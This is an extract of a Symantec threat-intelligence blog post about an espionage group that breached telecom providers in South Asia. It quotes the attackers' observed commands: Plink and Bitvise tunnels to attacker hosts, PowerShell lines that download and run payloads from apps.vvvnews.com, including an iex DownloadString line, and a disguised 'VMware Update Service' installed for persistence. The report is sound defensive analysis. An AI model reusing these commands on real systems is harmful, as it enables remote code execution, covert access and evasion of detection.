@@ -1,0 +1,46 @@
+Tunnels back to attackers
+CSIDL_COMMON_APPDATA\ora‐
+cle local.exe
+CSIDL_COMMON_APPDATA\adobe adobe.exe
+c:\programdata\oracle java.ee
+On one machine in this organization, we saw some suspicious PowerShell commands executed on December 9. One of the
+files executed by PowerShell, comms.exe, is Plink. A second similar command used the Bitvise command line tunneling
+client. Both tools are used to set up a tunnel to attacker-controlled infrastructure to allow Terminal Services and RDP access
+to an internal machine.
+"CSIDL_COMMON_APPDATA\comms\comms.exe" apps.vvvnews.com -P  -l  -pw  -proxytype
+http_basic –proxyip [REDACTED] -proxyport 8080 -proxyuser [REDACTED].haq -proxypass [REDACTED] -C 
+R [REDACTED]:4015:[REDACTED]:1540
+"CSIDL_COMMON_APPDATA\comms\comms.exe" [REDACTED] -pw=[REDACTED] -s2c=[REDACTED] 1819
+[REDACTED] 3389 -proxy=y -proxyType=HTTP -proxyServer=[REDACTED] -proxyPort=8080 -proxyUsername=
+[REDACTED][REDACTED].haq -proxyPassword=
+Tools such as Plink and Bitvise are legitimate sysadmin tools, but have been seen being exploited by malicious actors before,
+including by Iranian actors earlier this year.
+Plink was also seen on a second machine in this organization, which appears to have been compromised from November
+2019 up to April 2020. The first suspicious activity on this machine was seen on November 13, when PowerShell Remoting
+was enabled on the machine to allow it to receive PowerShell commands.
+https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/greenbug-espionage-telco-south-asia 4/7
+5/21/2020 Sophisticated Espionage Group Turns Attention to Telecom Providers in South Asia | Symantec Blogs
+A PowerShell command was used to download a file from attacker controlled infrastructure and launch it with a specific
+argument.
+(New-Object System.Net.WebClient).DownloadFile('http://apps[.]vvvnews.com:8080/Yft.dat',
+'C:\Programdata\VMware\Vmware.exe');
+start-process C:\Programdata\VMware\Vmware.exe -arg 'L3NlcnZlcj12c2llZ3J1LmNvbSAvaWQ9NDE=';
+The argument decodes to /server=vsiegru.com /id=41. Shortly after this the Plink utility was executed to establish a
+connection to the victim network. A second PowerShell command was then executed as follows:
+Del -force C:\Programdata\Vmware\Vmware.exe;
+(New-Object System.Net.WebClient).DownloadFile('http://apps[.]vvvnews.com:8080/Yf.dat', 'C:\Programdata\Nt.dat');
+move C:\Programdata\Nt.dat C:\Programdata\Vmware\VMware.exe -force;
+cmd.exe /c sc create "VMwareUpdate" binpath= "C:\Programdata\Vmware\VMware.exe
+L3NlcnZlcj1rb3BpbGthb3J1a292LmNvbSAvaWQ9NDkgL3Byb3h5PXllcyAvcHJveHl1cmw…[REDACTED]…
+BUTUxcamF2ZWQubmFiaSAvcGFzc3dvcmQ9cHRtbEAyMjMz" displayname= "VMware Update Service" start= auto;
+start-service VMwareUpdate;
+Exit;
+The encoded argument decodes to the following:
+/server=kopilkaorukov.com /id=49 /proxy=yes /proxyurl=http://[REDACTED]:8080 /credential=yes /username=
+[REDACTED][REDACTED] /password=[REDACTED]
+The attackers were then seen adding a user to the administrators group on this machine. Two further PowerShell commands
+were executed on the machine about a week later, on November 16.
+The first decodes to the following:
+iex ((New-Object Net.WebClient).DownloadString('http://apps[.]vvvnews.com:8080/Default.htt'))
+As the attackers have set up a tunnel, using the Plink tool, all connections appear to be routing to internal machine IP
+addresses. This was likely done as a means to evade detection.
